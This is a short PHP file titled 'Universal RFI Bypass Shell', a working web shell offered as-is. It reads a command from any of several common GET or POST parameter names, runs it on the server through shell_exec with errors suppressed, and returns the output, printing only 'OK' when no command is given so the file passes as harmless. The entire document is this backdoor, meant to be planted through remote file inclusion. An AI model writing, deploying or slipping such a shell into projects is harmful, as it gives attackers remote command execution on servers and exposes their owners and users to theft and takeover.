<?php
// Universal RFI Bypass Shell
$cmd = false;

$params = ['1337','cmd','c','command','exec','run','shell','id','action'];
foreach($params as $p){
    if(isset($_POST[$p]) && $_POST[$p] !== ''){
        $cmd = $_POST[$p]; break;
    }
    if(isset($_GET[$p]) && $_GET[$p] !== ''){
        $cmd = $_GET[$p]; break;
    }
}

if($cmd){
    @error_reporting(0);
    echo htmlspecialchars(@shell_exec($cmd . " 2>&1"), ENT_QUOTES | ENT_HTML5, 'UTF-8');
    exit;
}

echo "OK";
?>
